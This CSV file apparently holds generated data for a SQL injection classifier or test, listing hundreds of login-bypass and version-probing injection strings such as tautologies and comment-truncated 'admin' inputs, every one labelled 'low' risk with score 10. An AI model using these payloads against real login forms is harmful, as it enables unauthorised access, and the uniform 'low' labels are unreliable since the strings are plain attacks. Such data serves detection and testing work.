query,risk,score
' OR 1 IN (SELECT @@version) -- # dv,low,10
admin' -- -- 3,low,10
1' or '1'='1 /**/,low,10
' OR 'a'='a # zy,low,10
' || 1=1 -- # 6w,low,10
' OR 1=1 -- -- t,low,10
1' OR '1'='1 -- x,low,10
admin' /**/ -- p,low,10
' OR 'a'='a /**/,low,10
' || 1=1 -- # lp,low,10
' OR 1=1 LIMIT 1 -- -- 0,low,10
' OR 1=1 -- # 1r,low,10
admin' -- -- 8,low,10
' or 'a'='a /**/,low,10
admin' /**/ -- w,low,10
' OR 1 IN (SELECT @@version) -- # f1,low,10
' OR 'a'='a -- d,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- -- u,low,10
' OR 'a'='a # vb,low,10
admin' /**/ -- y,low,10
' OR 1=1 LIMIT 1 -- # 7q,low,10
' or 'a'='a /**/,low,10
1' or '1'='1 -- f,low,10
' OR 1=1 LIMIT 1 -- -- x,low,10
admin' -- -- j,low,10
' OR 'a'='a /**/,low,10
1' or true -- # cx,low,10
admin' /**/ /**/,low,10
admin' -- /**/,low,10
' OR 'a'='a -- 3,low,10
' or 'a'='a # mn,low,10
""" OR ""1""=""1 # cs",low,10
admin' /**/ # d0,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- # oy,low,10
' || 1=1 -- # bp,low,10
' or 'a'='a # lt,low,10
' || 1=1 -- -- y,low,10
1' or true -- # vx,low,10
admin' /**/ /**/,low,10
1' OR '1'='1 # 97,low,10
' || 1=1 -- /**/,low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 -- p,low,10
1' or true -- -- x,low,10
' || 1=1 -- -- 8,low,10
admin' /**/ /**/,low,10
""" OR ""1""=""1 -- u",low,10
admin' /**/ /**/,low,10
' OR 'x'='x -- 8,low,10
1' OR '1'='1 -- o,low,10
""" OR ""1""=""1 # oi",low,10
' or 'a'='a -- t,low,10
""" OR ""1""=""1 # 49",low,10
1' or true -- -- f,low,10
1' OR '1'='1 -- o,low,10
' or 'a'='a # ni,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 -- # ub,low,10
admin' /**/ # 8g,low,10
admin' -- /**/,low,10
1' OR '1'='1 # 3i,low,10
""" OR ""1""=""1 /**/",low,10
' OR 'a'='a -- b,low,10
1' or true -- /**/,low,10
1' OR '1'='1 # bf,low,10
' OR 'x'='x # mo,low,10
""" OR ""1""=""1 # kf",low,10
1' or true -- # bu,low,10
' OR 1=1 -- /**/,low,10
1' or 1=1 -- /**/,low,10
admin' -- # io,low,10
admin' -- /**/,low,10
' OR 'a'='a # 38,low,10
' or 'a'='a /**/,low,10
admin' -- # uy,low,10
1' or 1=1 -- /**/,low,10
admin' -- /**/,low,10
1' or '1'='1 # ti,low,10
admin' /**/ /**/,low,10
1' or 1=1 -- # v2,low,10
admin' -- -- h,low,10
' OR 'a'='a /**/,low,10
1' or true -- # fy,low,10
admin' /**/ /**/,low,10
' OR 1=1 -- -- n,low,10
' OR 'x'='x -- l,low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- # nf,low,10
1' or true -- -- y,low,10
' or 'a'='a -- 2,low,10
' || 1=1 -- # a6,low,10
1' OR '1'='1 # ok,low,10
1' or true -- # ts,low,10
' or 'a'='a /**/,low,10
admin' /**/ -- x,low,10
admin' /**/ -- 6,low,10
admin' -- /**/,low,10
1' or '1'='1 -- i,low,10
' or 'a'='a /**/,low,10
1' or 1=1 -- -- h,low,10
' or 'a'='a -- q,low,10
' OR 'a'='a /**/,low,10
admin' /**/ # y9,low,10
admin' /**/ # x0,low,10
admin' -- /**/,low,10
1' or '1'='1 -- l,low,10
admin' /**/ /**/,low,10
1' OR '1'='1 /**/,low,10
1' or true -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- -- m,low,10
' OR 'x'='x # pg,low,10
' || 1=1 -- -- w,low,10
1' or true -- /**/,low,10
' OR 1=1 -- /**/,low,10
' OR 'a'='a # rk,low,10
""" OR ""1""=""1 /**/",low,10
' OR 'a'='a -- y,low,10
1' or 1=1 -- # z5,low,10
1' OR '1'='1 # 7r,low,10
' OR 'x'='x -- i,low,10
' OR 'x'='x # os,low,10
admin' -- # lc,low,10
' OR 'x'='x # df,low,10
1' or 1=1 -- -- f,low,10
admin' -- -- j,low,10
' OR 'a'='a -- 4,low,10
' OR 'a'='a -- w,low,10
1' or '1'='1 # ek,low,10
' OR 'a'='a # u1,low,10
' or 'a'='a -- 7,low,10
""" OR ""1""=""1 -- 0",low,10
' or 'a'='a -- c,low,10
' OR 1=1 LIMIT 1 -- -- 2,low,10
' OR 1=1 LIMIT 1 -- # m6,low,10
1' or 1=1 -- # 0h,low,10
' OR 'a'='a /**/,low,10
1' or '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- # gd,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 # am",low,10
admin' -- /**/,low,10
admin' -- /**/,low,10
1' or 1=1 -- /**/,low,10
admin' -- /**/,low,10
' or 'a'='a -- 8,low,10
' OR 'x'='x # y4,low,10
' OR 'x'='x # 4n,low,10
1' or '1'='1 # 9t,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- # 32,low,10
admin' -- -- x,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 # n3",low,10
' OR 1=1 LIMIT 1 -- -- z,low,10
1' or true -- /**/,low,10
1' or '1'='1 /**/,low,10
""" OR ""1""=""1 # 9v",low,10
1' or '1'='1 -- m,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- /**/,low,10
""" OR ""1""=""1 # 02",low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' OR '1'='1 # wl,low,10
' or 'a'='a -- w,low,10
' OR 'x'='x # p6,low,10
admin' -- # ay,low,10
1' or '1'='1 -- x,low,10
' OR 'a'='a /**/,low,10
' || 1=1 -- # em,low,10
' OR 'x'='x -- l,low,10
1' or 1=1 -- -- z,low,10
' OR 'a'='a /**/,low,10
1' or 1=1 -- -- 1,low,10
1' OR '1'='1 # wn,low,10
' OR 'x'='x # 61,low,10
' OR 1=1 LIMIT 1 -- -- l,low,10
1' or true -- # 1j,low,10
""" OR ""1""=""1 /**/",low,10
1' or true -- -- t,low,10
' OR 1=1 LIMIT 1 -- -- x,low,10
' OR 1=1 LIMIT 1 -- -- n,low,10
1' or '1'='1 /**/,low,10
' OR 'a'='a # m1,low,10
' OR 1=1 LIMIT 1 -- -- d,low,10
1' or 1=1 -- -- l,low,10
admin' -- # l3,low,10
admin' -- # cb,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' or 'a'='a # g1,low,10
1' or true -- -- g,low,10
1' or 1=1 -- -- d,low,10
1' or '1'='1 # vs,low,10
1' or true -- /**/,low,10
1' or '1'='1 # wn,low,10
' OR 'x'='x # uh,low,10
' || 1=1 -- # s8,low,10
' OR 'x'='x -- 9,low,10
' OR 1=1 -- # rg,low,10
1' or '1'='1 # ne,low,10
' OR 1 IN (SELECT @@version) -- # xf,low,10
""" OR ""1""=""1 -- u",low,10
' OR 1 IN (SELECT @@version) -- # b7,low,10
admin' -- # 00,low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- # jk,low,10
1' or true -- /**/,low,10
' OR 'x'='x # sq,low,10
1' or true -- -- w,low,10
admin' -- # 5f,low,10
' OR 'x'='x -- 1,low,10
' || 1=1 -- # vn,low,10
' OR 1=1 LIMIT 1 -- -- 5,low,10
1' or true -- # mb,low,10
' or 'a'='a /**/,low,10
' OR 1=1 -- -- f,low,10
' OR 'x'='x # yu,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or 1=1 -- -- c,low,10
1' or 1=1 -- /**/,low,10
' || 1=1 -- /**/,low,10
admin' -- -- p,low,10
""" OR ""1""=""1 # 4i",low,10
' || 1=1 -- /**/,low,10
' or 'a'='a -- o,low,10
admin' /**/ -- h,low,10
' OR 1=1 LIMIT 1 -- -- h,low,10
' OR 1=1 -- -- 2,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
' OR 1=1 -- /**/,low,10
admin' -- # 29,low,10
1' or '1'='1 # 2d,low,10
1' OR '1'='1 /**/,low,10
admin' -- -- u,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 /**/,low,10
1' or 1=1 -- /**/,low,10
admin' -- # s0,low,10
1' or true -- /**/,low,10
1' or '1'='1 -- 4,low,10
1' or '1'='1 # y7,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 -- -- 8,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- u,low,10
1' OR '1'='1 -- u,low,10
""" OR ""1""=""1 -- d",low,10
admin' -- /**/,low,10
1' or '1'='1 -- e,low,10
admin' /**/ -- o,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # gg,low,10
admin' /**/ -- q,low,10
' OR 'a'='a /**/,low,10
' || 1=1 -- # af,low,10
' OR 'x'='x -- i,low,10
' OR 1=1 LIMIT 1 -- # h6,low,10
admin' -- # s1,low,10
admin' /**/ /**/,low,10
' OR 1=1 -- # yu,low,10
admin' -- -- 4,low,10
' OR 'a'='a -- u,low,10
admin' /**/ -- t,low,10
1' OR '1'='1 /**/,low,10
admin' /**/ /**/,low,10
admin' -- -- k,low,10
' or 'a'='a -- 7,low,10
1' OR '1'='1 /**/,low,10
admin' -- /**/,low,10
admin' -- # t0,low,10
admin' -- /**/,low,10
admin' -- # ln,low,10
1' OR '1'='1 # 7u,low,10
' || 1=1 -- -- 1,low,10
1' or 1=1 -- # j7,low,10
' OR 1=1 -- -- 9,low,10
1' or 1=1 -- /**/,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a # qp,low,10
admin' /**/ -- v,low,10
' || 1=1 -- /**/,low,10
admin' /**/ -- 6,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- # 2n,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1=1 LIMIT 1 -- # 80,low,10
1' or '1'='1 /**/,low,10
""" OR ""1""=""1 # d7",low,10
admin' /**/ # qj,low,10
' || 1=1 -- /**/,low,10
admin' /**/ /**/,low,10
1' OR '1'='1 # bk,low,10
""" OR ""1""=""1 /**/",low,10
1' or 1=1 -- -- e,low,10
admin' -- -- b,low,10
' OR 'x'='x # qt,low,10
' or 'a'='a -- s,low,10
' OR 1=1 -- /**/,low,10
' || 1=1 -- -- 9,low,10
admin' -- /**/,low,10
' OR 1=1 -- # d7,low,10
1' or true -- /**/,low,10
1' or '1'='1 # 9m,low,10
admin' /**/ # x8,low,10
' OR 'a'='a -- 7,low,10
' or 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- -- w,low,10
admin' /**/ /**/,low,10
admin' -- # f9,low,10
admin' -- -- v,low,10
1' OR '1'='1 -- 9,low,10
' OR 1=1 -- # f2,low,10
' OR 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' /**/ # 3u,low,10
1' or '1'='1 /**/,low,10
' or 'a'='a # 4t,low,10
admin' -- # sn,low,10
' OR 'x'='x /**/,low,10
1' or true -- # 7e,low,10
' OR 'x'='x # 9d,low,10
' OR 1=1 -- -- 4,low,10
1' OR '1'='1 -- e,low,10
' OR 1 IN (SELECT @@version) -- # gl,low,10
' OR 'a'='a # tz,low,10
' OR 1=1 LIMIT 1 -- -- z,low,10
admin' -- /**/,low,10
1' or 1=1 -- # 1a,low,10
1' or '1'='1 -- 3,low,10
admin' -- -- 1,low,10
' OR 'a'='a # lx,low,10
' or 'a'='a -- y,low,10
' OR 'x'='x /**/,low,10
' OR 1=1 -- # oy,low,10
' OR 'x'='x /**/,low,10
1' or true -- -- 5,low,10
1' OR '1'='1 /**/,low,10
' OR 1=1 -- -- h,low,10
' OR 'a'='a /**/,low,10
' or 'a'='a # xr,low,10
' || 1=1 -- -- h,low,10
admin' -- /**/,low,10
admin' /**/ /**/,low,10
admin' -- /**/,low,10
' OR 'a'='a # g6,low,10
1' or true -- -- 1,low,10
' OR 'a'='a -- 8,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
1' or 1=1 -- # 7v,low,10
' OR 1=1 -- # hq,low,10
""" OR ""1""=""1 -- z",low,10
1' or 1=1 -- /**/,low,10
1' or true -- # ku,low,10
admin' /**/ # 9j,low,10
1' or '1'='1 -- i,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- -- f,low,10
1' or true -- # 7n,low,10
' OR 'a'='a /**/,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- k,low,10
admin' /**/ /**/,low,10
""" OR ""1""=""1 # mf",low,10
1' or '1'='1 # tg,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- -- c,low,10
' || 1=1 -- # sc,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- # ux,low,10
""" OR ""1""=""1 /**/",low,10
' OR 1=1 -- /**/,low,10
' OR 'a'='a -- p,low,10
' OR 'a'='a -- w,low,10
' OR 'a'='a # xx,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- # 9m,low,10
""" OR ""1""=""1 # 4e",low,10
1' or 1=1 -- /**/,low,10
1' or '1'='1 # sn,low,10
1' or 1=1 -- -- d,low,10
""" OR ""1""=""1 -- f",low,10
1' or true -- -- r,low,10
' OR 1=1 LIMIT 1 -- # w8,low,10
' or 'a'='a /**/,low,10
admin' /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- # xv,low,10
' OR 'a'='a # 2s,low,10
' OR 1=1 -- # 62,low,10
' OR 1=1 LIMIT 1 -- -- t,low,10
' OR 1=1 -- -- 6,low,10
1' or 1=1 -- -- s,low,10
' or 'a'='a # vk,low,10
1' OR '1'='1 # xt,low,10
1' OR '1'='1 /**/,low,10
1' or true -- -- 8,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # s0,low,10
""" OR ""1""=""1 -- v",low,10
1' or true -- /**/,low,10
' OR 'x'='x # u9,low,10
' OR 'a'='a /**/,low,10
1' or true -- -- 3,low,10
1' or '1'='1 # kz,low,10
' OR 'x'='x -- n,low,10
""" OR ""1""=""1 -- 2",low,10
1' OR '1'='1 /**/,low,10
1' or true -- -- f,low,10
' OR 1=1 LIMIT 1 -- -- 0,low,10
1' or 1=1 -- /**/,low,10
admin' /**/ -- u,low,10
1' or '1'='1 -- n,low,10
1' or '1'='1 # 2p,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- /**/,low,10
admin' /**/ # 2z,low,10
1' or 1=1 -- # az,low,10
admin' -- # j5,low,10
1' or 1=1 -- # 46,low,10
""" OR ""1""=""1 # m6",low,10
' OR 'x'='x # gv,low,10
1' OR '1'='1 -- 1,low,10
' OR 1=1 -- # 27,low,10
1' OR '1'='1 -- t,low,10
' || 1=1 -- -- e,low,10
' OR 'a'='a -- x,low,10
' OR 'a'='a /**/,low,10
' OR 'a'='a /**/,low,10
1' or '1'='1 # y3,low,10
' OR 1=1 -- # 7k,low,10
' OR 'a'='a -- k,low,10
1' or '1'='1 /**/,low,10
1' or '1'='1 # 7u,low,10
admin' -- # ax,low,10
' OR 'x'='x /**/,low,10
' OR 1 IN (SELECT @@version) -- -- w,low,10
1' or true -- -- a,low,10
admin' -- /**/,low,10
admin' -- -- c,low,10
1' or true -- # 3f,low,10
1' OR '1'='1 # 65,low,10
admin' -- /**/,low,10
1' or true -- /**/,low,10
' || 1=1 -- -- d,low,10
1' OR '1'='1 -- c,low,10
1' or true -- -- q,low,10
' OR 1=1 -- # 6f,low,10
1' or 1=1 -- /**/,low,10
admin' -- /**/,low,10
1' or true -- /**/,low,10
' OR 'x'='x /**/,low,10
1' or true -- /**/,low,10
admin' /**/ # v9,low,10
""" OR ""1""=""1 # ch",low,10
admin' -- /**/,low,10
admin' -- /**/,low,10
' or 'a'='a -- m,low,10
admin' -- # uc,low,10
admin' /**/ # so,low,10
1' or true -- -- 1,low,10
' OR 'a'='a /**/,low,10
""" OR ""1""=""1 /**/",low,10
admin' /**/ # wg,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or '1'='1 -- 4,low,10
' OR 1=1 -- # 3a,low,10
1' or 1=1 -- # 6l,low,10
' || 1=1 -- # 99,low,10
' or 'a'='a -- o,low,10
' OR 'a'='a /**/,low,10
1' OR '1'='1 # p8,low,10
1' OR '1'='1 /**/,low,10
1' or true -- -- u,low,10
' or 'a'='a # fi,low,10
' OR 'x'='x # bn,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- -- q,low,10
admin' -- -- z,low,10
' OR 1=1 LIMIT 1 -- -- f,low,10
' OR 'a'='a -- 4,low,10
' OR 1=1 LIMIT 1 -- # 95,low,10
admin' /**/ # 30,low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 -- e,low,10
1' OR '1'='1 -- x,low,10
admin' -- -- u,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- /**/,low,10
' || 1=1 -- -- y,low,10
' OR 'x'='x /**/,low,10
1' or 1=1 -- /**/,low,10
' OR 'a'='a /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or true -- -- m,low,10
1' OR '1'='1 -- 4,low,10
' OR 1 IN (SELECT @@version) -- -- k,low,10
' OR 'a'='a # px,low,10
1' or 1=1 -- /**/,low,10
1' or true -- -- 0,low,10
1' OR '1'='1 # aj,low,10
1' or '1'='1 # 5p,low,10
1' or 1=1 -- -- e,low,10
1' or true -- -- z,low,10
1' or 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' || 1=1 -- /**/,low,10
admin' /**/ /**/,low,10
admin' -- /**/,low,10
' OR 'a'='a -- m,low,10
admin' -- /**/,low,10
' OR 1=1 LIMIT 1 -- # hh,low,10
' OR 'a'='a -- g,low,10
' OR 1=1 LIMIT 1 -- -- 6,low,10
1' OR '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- -- n,low,10
1' or true -- # r4,low,10
admin' -- # 4j,low,10
' OR 1=1 -- -- 8,low,10
1' or 1=1 -- # 34,low,10
' or 'a'='a # at,low,10
' or 'a'='a -- 4,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' OR '1'='1 # bp,low,10
admin' /**/ -- 5,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 'x'='x -- g,low,10
1' OR '1'='1 -- e,low,10
admin' /**/ # z2,low,10
1' or '1'='1 # 4s,low,10
' or 'a'='a -- v,low,10
1' or '1'='1 # 1q,low,10
admin' -- -- y,low,10
admin' -- # sc,low,10
admin' /**/ # db,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # nc,low,10
' OR 'a'='a # 3h,low,10
1' or true -- # zl,low,10
' OR 'x'='x # qd,low,10
1' or '1'='1 -- 7,low,10
admin' -- /**/,low,10
' or 'a'='a # o7,low,10
' OR 'a'='a /**/,low,10
' OR 'x'='x -- e,low,10
admin' /**/ /**/,low,10
admin' -- # 4c,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- /**/,low,10
1' or true -- # mm,low,10
admin' -- -- 3,low,10
' OR 1=1 LIMIT 1 -- -- s,low,10
admin' -- -- k,low,10
' OR 'a'='a -- 7,low,10
' OR 'a'='a -- 6,low,10
admin' -- -- m,low,10
1' or true -- -- m,low,10
' OR 1=1 LIMIT 1 -- -- u,low,10
admin' -- # c3,low,10
' OR 1=1 LIMIT 1 -- -- g,low,10
' OR 1 IN (SELECT @@version) -- -- o,low,10
' OR 1=1 LIMIT 1 -- -- i,low,10
' OR 1 IN (SELECT @@version) -- -- y,low,10
1' OR '1'='1 -- d,low,10
admin' /**/ -- z,low,10
1' or true -- -- 6,low,10
""" OR ""1""=""1 # 15",low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- -- g,low,10
' or 'a'='a /**/,low,10
' || 1=1 -- -- m,low,10
admin' /**/ # k5,low,10
' or 'a'='a # g9,low,10
' || 1=1 -- /**/,low,10
admin' -- # f2,low,10
' or 'a'='a /**/,low,10
1' OR '1'='1 /**/,low,10
admin' /**/ /**/,low,10
1' or '1'='1 # 8z,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- -- v,low,10
1' or true -- /**/,low,10
admin' -- # lk,low,10
' OR 1 IN (SELECT @@version) -- -- 2,low,10
' OR 1=1 LIMIT 1 -- # 3w,low,10
1' or true -- # pe,low,10
admin' -- /**/,low,10
' || 1=1 -- -- t,low,10
' OR 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
' || 1=1 -- # 9n,low,10
admin' -- /**/,low,10
' or 'a'='a # 5s,low,10
admin' -- # 76,low,10
' or 'a'='a # rr,low,10
1' or '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- 9,low,10
1' or true -- # tp,low,10
1' OR '1'='1 /**/,low,10
""" OR ""1""=""1 -- a",low,10
1' or '1'='1 -- e,low,10
admin' -- /**/,low,10
' || 1=1 -- # 3e,low,10
1' or 1=1 -- # 1p,low,10
' || 1=1 -- -- z,low,10
1' or true -- /**/,low,10
admin' /**/ # aj,low,10
admin' -- -- y,low,10
' OR 1=1 -- -- a,low,10
' OR 'a'='a -- l,low,10
1' or 1=1 -- -- o,low,10
admin' -- -- r,low,10
1' or true -- -- j,low,10
' or 'a'='a -- s,low,10
' OR 1=1 LIMIT 1 -- # cz,low,10
' OR 'x'='x -- q,low,10
' OR 'a'='a -- d,low,10
admin' /**/ /**/,low,10
admin' /**/ # 3g,low,10
admin' /**/ /**/,low,10
1' or true -- # 7r,low,10
' OR 'a'='a -- k,low,10
admin' /**/ -- h,low,10
' OR 1=1 -- -- v,low,10
1' or true -- /**/,low,10
1' OR '1'='1 -- c,low,10
admin' /**/ /**/,low,10
' OR 'a'='a -- b,low,10
admin' /**/ -- 1,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- -- o,low,10
""" OR ""1""=""1 # 9z",low,10
' or 'a'='a # 18,low,10
1' or 1=1 -- # bf,low,10
' or 'a'='a # 89,low,10
admin' -- -- 0,low,10
' || 1=1 -- -- 6,low,10
""" OR ""1""=""1 # j3",low,10
' OR 'a'='a # yy,low,10
1' or true -- -- v,low,10
' OR 1=1 -- /**/,low,10
1' or '1'='1 -- 5,low,10
' or 'a'='a /**/,low,10
1' or 1=1 -- # jh,low,10
' or 'a'='a -- 1,low,10
1' OR '1'='1 # f8,low,10
' OR 1=1 -- # pc,low,10
' OR 1=1 -- /**/,low,10
admin' /**/ -- p,low,10
1' or 1=1 -- /**/,low,10
1' or true -- # 13,low,10
1' or '1'='1 /**/,low,10
' or 'a'='a -- a,low,10
admin' /**/ /**/,low,10
' OR 1=1 -- /**/,low,10
1' or 1=1 -- # b4,low,10
' or 'a'='a -- u,low,10
admin' -- # 5y,low,10
admin' -- # g0,low,10
admin' -- -- b,low,10
' OR 1=1 -- # ts,low,10
1' or true -- /**/,low,10
admin' -- /**/,low,10
admin' -- -- 8,low,10
' OR 'x'='x # tq,low,10
' OR 'a'='a -- c,low,10
admin' -- # fb,low,10
' OR 'a'='a -- d,low,10
' || 1=1 -- # yf,low,10
admin' /**/ -- i,low,10
' OR 1=1 LIMIT 1 -- # de,low,10
""" OR ""1""=""1 # 47",low,10
' OR 'a'='a -- n,low,10
admin' -- # mi,low,10
' OR 1 IN (SELECT @@version) -- -- p,low,10
' OR 'a'='a -- 7,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 'a'='a /**/,low,10
1' OR '1'='1 # 8a,low,10
admin' -- /**/,low,10
' OR 1=1 -- -- y,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- -- q,low,10
1' or 1=1 -- /**/,low,10
1' or true -- /**/,low,10
admin' /**/ # gw,low,10
' or 'a'='a -- m,low,10
admin' -- /**/,low,10
' OR 'a'='a /**/,low,10
' || 1=1 -- -- q,low,10
' or 'a'='a /**/,low,10
1' or true -- /**/,low,10
1' or 1=1 -- # pu,low,10
admin' -- -- o,low,10
""" OR ""1""=""1 -- 3",low,10
' || 1=1 -- # op,low,10
' OR 1 IN (SELECT @@version) -- -- t,low,10
""" OR ""1""=""1 -- b",low,10
1' or true -- /**/,low,10
' OR 'a'='a -- 0,low,10
' or 'a'='a -- u,low,10
1' or '1'='1 -- x,low,10
1' or 1=1 -- /**/,low,10
admin' -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- p,low,10
1' or 1=1 -- -- 5,low,10
admin' -- # 62,low,10
' OR 'x'='x -- 3,low,10
' or 'a'='a # yu,low,10
' OR 1 IN (SELECT @@version) -- -- 4,low,10
admin' /**/ /**/,low,10
' or 'a'='a -- p,low,10
admin' -- # qm,low,10
admin' -- /**/,low,10
' or 'a'='a -- 8,low,10
' or 'a'='a -- 6,low,10
admin' -- -- 1,low,10
1' or '1'='1 /**/,low,10
1' OR '1'='1 # h3,low,10
1' or 1=1 -- # 9y,low,10
1' or true -- # 87,low,10
' OR 1=1 -- -- 8,low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- -- b,low,10
1' or true -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
""" OR ""1""=""1 # e6",low,10
admin' -- -- c,low,10
admin' /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- # vv,low,10
' OR 'a'='a # lz,low,10
' OR 1=1 LIMIT 1 -- -- q,low,10
' OR 1=1 LIMIT 1 -- # q0,low,10
1' OR '1'='1 # vz,low,10
' OR 1 IN (SELECT @@version) -- # o8,low,10
' OR 1=1 -- -- c,low,10
' or 'a'='a -- 8,low,10
' OR 1=1 LIMIT 1 -- -- c,low,10
' OR 1=1 -- -- j,low,10
' OR 'a'='a # 7t,low,10
' OR 1=1 LIMIT 1 -- # 26,low,10
' OR 1=1 -- /**/,low,10
admin' /**/ # ed,low,10
admin' /**/ /**/,low,10
' or 'a'='a /**/,low,10
' OR 1 IN (SELECT @@version) -- # db,low,10
1' or '1'='1 /**/,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a # tc,low,10
' OR 1 IN (SELECT @@version) -- # ag,low,10
' OR 1=1 LIMIT 1 -- # z7,low,10
' OR 1=1 -- # 7z,low,10
1' or 1=1 -- -- c,low,10
1' or '1'='1 /**/,low,10
' or 'a'='a # 78,low,10
' OR 'x'='x -- k,low,10
admin' /**/ # ai,low,10
1' or 1=1 -- -- l,low,10
' OR 1=1 -- # 5t,low,10
' OR 'x'='x -- a,low,10
' OR 'x'='x /**/,low,10
admin' /**/ # 0d,low,10
' OR 1=1 -- /**/,low,10
1' or true -- # ew,low,10
' OR 1=1 LIMIT 1 -- # 1u,low,10
' OR 1 IN (SELECT @@version) -- -- 9,low,10
' OR 1=1 LIMIT 1 -- # 2e,low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 -- j,low,10
""" OR ""1""=""1 # dl",low,10
admin' -- /**/,low,10
""" OR ""1""=""1 -- m",low,10
' OR 1 IN (SELECT @@version) -- -- r,low,10
' OR 1=1 -- -- 0,low,10
admin' /**/ -- i,low,10
1' or 1=1 -- -- 4,low,10
""" OR ""1""=""1 -- 8",low,10
' OR 1=1 LIMIT 1 -- -- 4,low,10
' OR 'a'='a -- v,low,10
' OR 1 IN (SELECT @@version) -- -- u,low,10
' or 'a'='a -- q,low,10
' OR 1=1 LIMIT 1 -- # 7z,low,10
